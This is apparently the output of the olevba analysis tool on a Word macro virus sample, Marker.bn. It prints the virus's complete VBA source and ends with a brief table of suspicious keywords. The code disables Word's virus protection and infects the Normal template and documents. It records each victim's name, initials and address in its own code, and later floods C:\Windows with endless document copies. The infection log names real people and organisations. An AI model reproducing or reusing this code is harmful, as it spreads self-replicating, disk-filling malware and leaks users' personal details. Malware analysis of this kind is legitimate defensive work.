olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bn-bf636aaa054f6b95617389068144fcd67a78b3fb279bc94e0fde0b9bded308e0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bn-bf636aaa054f6b95617389068144fcd67a78b3fb279bc94e0fde0b9bded308e0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Ditry PC
' DP
'
' 1/5/2000 4:09:31 PM
'
' Ditry PC
' DP
'
' 1/5/2000 4:09:13 PM
'
' ICD
' I
'
' 16/11/1999 10:51:00 AM
'
' ICD
' I
'
' 15/11/1999 09:46:41 AM
'
' ICD
' I
'
' 14/11/1999 04:40:38 PM
'
' ICD
' I
'
' 13/11/1999 07:37:27 PM
'
' ICD
' I
'
' 13/11/1999 10:43:45 AM
'
' ICD
' I
'
' 12/11/1999 05:11:57 PM
'
' ICD
' I
'
' 12/11/1999 03:20:56 PM
'
' ICD
' I
'
' 12/11/1999 03:20:06 PM
'
' ICD
' I
'
' 12/11/1999 03:16:31 PM
'
' ICD
' I
'
' 12/11/1999 03:08:22 PM
'
' ICD
' I
'
' 12/11/1999 03:07:37 PM
'
' ICD
' I
'
' 12/11/1999 11:55:46 AM
'
' ICD
' I
'
' 12/11/1999 07:27:16 AM
'
' ICD
' I
'
' 11/11/1999 05:21:41 PM
'
' ICD
' I
'
' 11/11/1999 04:50:14 PM
'
' ICD
' I
'
' 11/11/1999 03:17:50 PM
'
' ICD
' I
'
' 11/11/1999 02:00:06 PM
'
' ICD
' I
'
' 11/11/1999 12:07:03 PM
'
' Jose Luis Restrepo
' JLR
'
' 10/11/1999 04:38:20 PM
'
' Jose Luis Restrepo
' JLR
'
' 10/11/1999 03:07:39 PM
'
' ECOPETROL
' E
'
' 11/10/1999 02:36:26 PM
'
' Muriel Cecilia BerbesÃ­
' MCB
'
' 29/10/1999 03:46:50 PM
'
' Muriel Berbesi
' MCB
'
' 28/10/1999 08:52:59 AM
'
' Muriel Berbesi
' MCB
'
' 28/10/1999 08:48:08 AM
'
' GAS NATURAL
' GN
'
' 26/10/1999 06:29:42 PM
'
' proyecto sap natural
' sapn
'
' 26/10/1999 06:26:28 PM
'
' proyecto sap natural
' sapn
'
' 22/10/1999 08:21:08 PM
'
' proyecto sap natural
' sapn
'
' 22/10/1999 07:15:24 PM
'
' proyecto sap natural
' sapn
'
' 22/10/1999 07:14:58 PM
'
' proyecto sap natural
' sapn
'
' 22/10/1999 09:21:49 AM
'
' proyecto sap natural
' sapn
'
' 20/10/1999 06:23:18 PM
'
' proyecto sap natural
' sapn
'
' 20/10/1999 06:21:02 PM
'
' proyecto sap natural
' sapn
'
' 20/10/1999 06:19:41 PM
'
' proyecto sap natural
' sapn
'
' 19/10/1999 07:32:46 PM
'
' proyecto sap natural
' sapn
'
' 15/10/1999 10:52:35 PM
'
' proyecto sap natural
' sapn
'
' 15/10/1999 12:06:06 PM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 09:01:56 PM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 10:40:08 AM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 08:38:33 AM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 08:36:56 AM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 08:36:24 AM
'
' proyecto sap natural
' sapn
'
' 14/10/1999 08:34:10 AM
'
' proyecto sap natural
' sapn
'
' 12/10/1999 10:36:29 AM
'
' proyecto sap natural
' sapn
'
' 11/10/1999 08:25:45 AM
'
' proyecto sap natural
' sapn
'
' 9/10/1999 05:20:17 PM
'
' proyecto sap natural
' sapn
'
' 8/10/1999 08:54:44 PM
'
' proyecto sap natural
' sapn
'
' 8/10/1999 11:45:04 AM
'
' proyecto sap natural
' sapn
'
' 8/10/1999 10:25:17 AM
'
' Gas Natural S.A.,E.S.P.
' GNS
'
' 8/10/1999 08:46:04 AM
'
' Gas Natural S.A.,E.S.P.
' GNS
'
' 29/09/1999 08:27:32 PM
'
' Gas Natural S.A.,E.S.P.
' GNS
'
' 27/09/1999 02:55:04 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 05:48:12 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 12:33:23 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 08:26:26 AM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 21/09/1999 03:00:13 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 17/09/1999 02:23:31 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 17/09/1999 08:44:12 AM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 16/09/1999 04:21:15 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 15/09/1999 05:07:11 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 15/09/1999 01:18:40 PM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 11:54:09 AM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 08:56:53 AM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 07:49:03 AM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 07:32:49 PM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 09:06:58 AM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 07:13:54 AM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 03:46:53 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 02:42:51 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 01:12:36 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 06:42:34 AM
'
' Gas Natural E.S.P.
' GNE
'
' 11/09/1999 12:49:32 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 06:37:09 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 03:57:12 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:55:49 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:36:26 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:24:13 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 08:06:32 AM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 08:03:05 PM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 07:45:41 PM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 08:03:19 AM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 06:43:38 AM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 04:04:36 PM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 07:55:24 AM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 07:51:52 AM
'
' COMPAQ
' C
'
' 7/09/1999 11:38:58 AM
'
' COMPAQ
' C
'
' 6/09/1999 03:09:00 PM
'
' COMPAQ
' C
'
' 6/09/1999 11:27:49 AM
'
' COMPAQ
' C
'
' 3/09/1999 03:58:05 PM
'
' COMPAQ
' C
'
' 3/09/1999 03:48:39 PM
'
' COMPAQ
' C
'
' 3/09/1999 02:35:46 PM
'
' GAS NATURAL
' GN
'
' 3/09/1999 12:57:38 PM
'
' GAS NATURAL
' GN
'
' 3/09/1999 11:51:42 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:50:25 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:50:09 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:49:46 AM
'
Private Sub Document_Close()
  
  On Error Resume Next
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.codemodule.Find(exi, 1, 1, 40000, 40000)
      Plainfec = Plan.codemodule.Find(exi, 1, 1, 40000, 40000)

      Ninfec = "'" & " " & Application.UserName & Chr(13) & "'" & " " & Application.UserInitials & Chr(13) & "'" & " " & Application.UserAddress & Chr(13) & "'" & " " & Now() & Chr(13) & "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      If Nume = nume1 Or Plainfec = False Then
         
         If DInfec = True And Plainfec = False Then
            Docu.codemodule.addfromstring Ninfec
            contemodu = Docu.codemodule.Lines(1, Docu.codemodule.CountOfLines)
            Plan.codemodule.addfromstring contemodu
         End If

         If DInfec = False And Plainfec = True Then
            Plan.codemodule.addfromstring Ninfec
            contemodu = Plan.codemodule.Lines(1, Plan.codemodule.CountOfLines)
            Docu.codemodule.addfromstring contemodu
         End If
         
         
      
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If

End Sub





















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

